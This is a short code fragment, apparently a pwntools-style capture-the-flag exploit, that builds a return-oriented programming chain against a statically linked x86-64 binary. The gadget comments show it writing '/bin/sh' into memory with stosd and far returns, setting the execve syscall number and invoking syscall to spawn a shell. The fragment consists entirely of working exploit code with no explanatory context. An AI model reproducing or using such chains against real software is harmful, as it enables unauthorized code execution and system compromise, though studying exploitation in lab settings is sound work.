payload = p64(0x4051a8)
#0x00000000004051a8: pop rax; ret; 
payload += p64(0x6e69622f)+p64(0x4011ad)
# 0x00000000004011ad: pop rbp; ret; 
payload += p64(0x2)+p64(0x4401ab)
# 0x00000000004401ab: pop rcx; ret; 
payload += p64(0x11d46d)+p64(0x42a364)
# 0x42a364: pop rdi ; and byte ptr [rbp + rcx*4 + 5], cl ; retf
payload += p64(0x475058)+p32(0x44568b)+p32(0x33)
# 0x44568b: stosd dword ptr [rdi], eax ; retf
payload += p32(0x4051a8)+p32(0x33)
# 0x00000000004051a8: pop rax; ret; 
payload += p64(0x68662f)+p64(0x4011ad)
# 0x00000000004011ad: pop rbp; ret; 
payload += p64(0x800000000004ad04)+p64(0x4401ab)
# 0x00000000004401ab: pop rcx; ret; 
payload += p64(0x200000000010a940)+p64(0x42a364)
# 0x42a364: pop rdi ; and byte ptr [rbp + rcx*4 + 5], cl ; retf
payload += p64(0x47505c)+p32(0x44568b)+p32(0x33)
# 0x44568b: stosd dword ptr [rdi], eax ; retf
payload += p32(0x4051a8)+p32(0x33)
# 0x00000000004051a8: pop rax; ret; 
payload += p64(0x0)+p64(0x4587e3)
# 0x00000000004587e3: xchg esi, eax; ret 0; 
payload += p64(0x42dd0a)
# 0x000000000042dd0a: pop rdx; ret 3; 
payload += p64(0x0)+p64(0x4051a8)+"\x00"*3
# 0x00000000004051a8: pop rax; ret; 
payload += p64(0x3b)+p64(0x4011ad)
# 0x00000000004011ad: pop rbp; ret; 
payload += p64(0xc00000000029140e)+p64(0x4401ab)
# 0x00000000004401ab: pop rcx; ret; 
payload += p64(0x1000000000078f91)+p64(0x42a364)
# 0x42a364: pop rdi ; and byte ptr [rbp + rcx*4 + 5], cl ; retf
payload += p64(0x475058)+p32(0x43df55)+p32(0x33)
# 0x000000000043df55: syscall; 
payload += b''
